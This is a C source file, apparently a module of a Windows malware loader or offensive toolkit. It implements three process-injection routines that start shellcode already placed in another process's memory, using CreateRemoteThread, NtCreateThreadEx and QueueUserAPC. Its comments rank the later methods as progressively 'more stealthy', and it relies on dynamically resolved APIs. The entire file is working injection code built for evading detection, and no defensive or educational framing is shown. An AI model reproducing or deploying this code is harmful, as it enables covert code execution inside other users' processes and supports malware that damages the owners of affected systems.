#include <windows.h>
#include <tlhelp32.h>
#include "../include/process_injection.h"
#include "../include/dynamic_api.h"

// Method 1: Standard CreateRemoteThread injection
BOOL inject_with_create_remote_thread(HANDLE processHandle, LPVOID remoteBuffer, API_POINTERS* apis) {
    HANDLE remoteThread = apis->pCreateRemoteThread(
        processHandle, NULL, 0, 
        (LPTHREAD_START_ROUTINE)remoteBuffer, 
        NULL, 0, NULL
    );
    
    if (remoteThread == NULL) {
        return FALSE;
    }
    
    apis->pWaitForSingleObject(remoteThread, INFINITE);
    apis->pCloseHandle(remoteThread);
    
    return TRUE;
}

// Method 2: NtCreateThreadEx injection (more stealthy)
BOOL inject_with_nt_create_thread_ex(HANDLE processHandle, LPVOID remoteBuffer, API_POINTERS* apis) {
    HANDLE remoteThread = NULL;
    
    // Function prototype for NtCreateThreadEx
    typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
        OUT PHANDLE ThreadHandle,
        IN ACCESS_MASK DesiredAccess,
        IN LPVOID ObjectAttributes,
        IN HANDLE ProcessHandle,
        IN LPVOID StartRoutine,
        IN LPVOID Argument,
        IN ULONG CreateFlags,
        IN SIZE_T ZeroBits,
        IN SIZE_T StackSize,
        IN SIZE_T MaximumStackSize,
        IN LPVOID AttributeList
    );
    
    pNtCreateThreadEx NtCreateThreadExFunc = (pNtCreateThreadEx)apis->pNtCreateThreadEx;
    
    if (NtCreateThreadExFunc == NULL) {
        return FALSE;
    }
    
    NTSTATUS status = NtCreateThreadExFunc(
        &remoteThread,
        PROCESS_ALL_ACCESS,
        NULL,
        processHandle,
        (LPVOID)remoteBuffer,
        NULL,
        0,
        0,
        0,
        0,
        NULL
    );
    
    if (status != 0 || remoteThread == NULL) {
        return FALSE;
    }
    
    apis->pWaitForSingleObject(remoteThread, INFINITE);
    apis->pCloseHandle(remoteThread);
    
    return TRUE;
}

// Method 3: QueueUserAPC injection (even more stealthy)
BOOL inject_with_queue_user_apc(HANDLE processHandle, LPVOID remoteBuffer, API_POINTERS* apis) {
    THREADENTRY32 te32;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    DWORD targetProcessId = GetProcessId(processHandle);
    BOOL success = FALSE;
    
    if (snapshot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    
    te32.dwSize = sizeof(THREADENTRY32);
    
    if (!Thread32First(snapshot, &te32)) {
        CloseHandle(snapshot);
        return FALSE;
    }
    
    // Iterate through all threads to find threads of the target process
    do {
        if (te32.th32OwnerProcessID == targetProcessId) {
            HANDLE threadHandle = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
            
            if (threadHandle != NULL) {
                // Queue APC to the thread
                if (QueueUserAPC((PAPCFUNC)remoteBuffer, threadHandle, 0)) {
                    success = TRUE;
                }
                CloseHandle(threadHandle);
            }
        }
    } while (Thread32Next(snapshot, &te32));
    
    CloseHandle(snapshot);
    return success;
} 